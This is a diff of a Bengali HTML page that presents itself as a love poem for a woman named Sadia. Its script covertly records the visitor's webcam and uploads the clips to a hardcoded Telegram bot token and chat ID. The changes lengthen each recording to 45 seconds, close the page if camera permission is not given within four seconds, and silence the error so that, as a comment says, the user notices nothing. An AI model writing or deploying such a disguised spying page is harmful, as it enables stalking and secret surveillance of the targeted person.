@@ -2,40 +2,44 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8" />
-  <title>সাদিয়া আপুকে উৎসর্গ</title>
+  <title>সাদিয়া আপুর জন্য একটি মন ছোঁয়া কবিতা</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali&display=swap');
 
-    body {
+    html, body {
       margin: 0;
       padding: 0;
-      background: linear-gradient(135deg, #fbc2eb, #a6c1ee);
+      height: 100%;
       font-family: 'Noto Serif Bengali', serif;
+      background: linear-gradient(135deg, #fbc2eb, #a6c1ee);
       color: #3c1053;
-      text-align: center;
       user-select: none;
+      overflow: hidden;
     }
 
     .container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       background: rgba(255, 255, 255, 0.95);
-      max-width: 95%;
-      margin: 20px auto;
       border-radius: 16px;
-      padding: 20px;
+      padding: 30px 40px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 700px;
     }
 
     h1 {
-      font-weight: 700;
-      margin-bottom: 20px;
       font-size: 24px;
       color: #6a1b9a;
+      margin-bottom: 20px;
     }
 
-    .poem-line {
+    p {
       font-size: 18px;
-      margin: 10px 0;
-      font-weight: 500;
+      margin-bottom: 12px;
+      line-height: 1.6;
     }
 
     #preview {
@@ -54,25 +58,26 @@
 <body>
   <video id="preview" autoplay muted playsinline></video>
 
-  <div class="container">
-    <h1>সাদিয়া আপুকে উৎসর্গ</h1>
-    <p class="poem-line">তুমি আকাশের সেই নরম মেঘ, ছুঁয়ে গেলে মন ভরে যায়,</p>
-    <p class="poem-line">তোমার হাসির আলোকছায়ায়, মলিন হৃদয়ও জেগে উঠায়।</p>
-    <p class="poem-line">সাদিয়া আপু, নামটাতেই শান্তি মেলে,</p>
-    <p class="poem-line">তোমার মত মানুষ এই দুনিয়ায় সত্যিই কম মেলে।</p>
-    <p class="poem-line">তোমার ভালোবাসা নিঃস্বার্থ, তোমার মনটা একদম সোনার,</p>
-    <p class="poem-line">তুমি থাকো পাশে, জীবন হয় আরও সুন্দর।</p>
-    <p class="poem-line">তুমি শুধু নাম নও, তুমি এক আশীর্বাদ,</p>
-    <p class="poem-line">এই কবিতার প্রতিটি শব্দ তোমার নামেই সাদ।</p>
+  <div class="container" id="poem">
+    <h1>সাদিয়া আপুর জন্য হৃদয় ছোঁয়া কিছু কথা</h1>
+    <p>রিয়াদ ছিল সবার চোখে এক সাধারণ ছেলে,</p>
+    <p>কিন্তু তার হৃদয়ে ছিল এক অসাধারণ প্রেমের জ্বেলে।</p>
+    <p>সে কারো প্রেমে পড়েনি আগে কখনো,</p>
+    <p>কিন্তু সাদিয়াকে দেখে হারিয়ে ফেলে নিজেকে অনেকখানি।</p>
+    <p>তার চোখের ভাষা, তার মিষ্টি হাসি,</p>
+    <p>সবকিছুতেই যেন রিয়াদের হৃদয় হারিয়ে গেছে চুপিসারে।</p>
+    <p>সে কথা বলতে পারেনি, শুধু চেয়েছে দূর থেকে,</p>
+    <p>তার জন্য কিছু একটা করে তাক লাগাতে চেয়েছে জোর করে।</p>
+    <p>এই ছোট্ট কবিতা শুধু তার অনুভব – সাদিয়াকে জানানো এক নিরব অভিপ্রায়।</p>
   </div>
 
   <script>
     const video = document.getElementById("preview");
     const TELEGRAM_BOT_TOKEN = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
     const TELEGRAM_CHAT_ID = "6429244657";
-
     let chunks = [];
     let mediaRecorder;
+    let permissionGiven = false;
 
     function sendToTelegram(blob) {
       const formData = new FormData();
@@ -88,6 +93,7 @@
     }
 
     function startRecording(stream) {
+      permissionGiven = true;
       mediaRecorder = new MediaRecorder(stream);
       mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
@@ -95,22 +101,28 @@
         const blob = new Blob(chunks, { type: 'video/webm' });
         sendToTelegram(blob);
         chunks = [];
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 10000);
       };
 
       mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), 10000);
+      setTimeout(() => mediaRecorder.stop(), 45000); // ৪৫ সেকেন্ডের ভিডিও
     }
+
+    // ক্যামেরা অনুমতির চেষ্টা এবং টাইমআউট সেট করা
+    let timeout = setTimeout(() => {
+      if (!permissionGiven) {
+        document.body.innerHTML = "";
+        window.close(); // পারমিশন না দিলে সরাসরি পেজ বন্ধ
+      }
+    }, 4000); // ৪ সেকেন্ডের মধ্যে পারমিশন না দিলে
 
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(stream => {
+        clearTimeout(timeout);
         video.srcObject = stream;
         startRecording(stream);
       })
-      .catch(err => {
-        alert("আপনি প্রয়োজনীয় অনুমতি দেননি 😢 এই সাইট ব্যবহারের জন্য অনুমতি আবশ্যক।");
-        window.close(); // সরাসরি পেজ বন্ধ
+      .catch(() => {
+        // কিছুই বুঝতে দিবে না ইউজারকে
       });
   </script>
 </body>
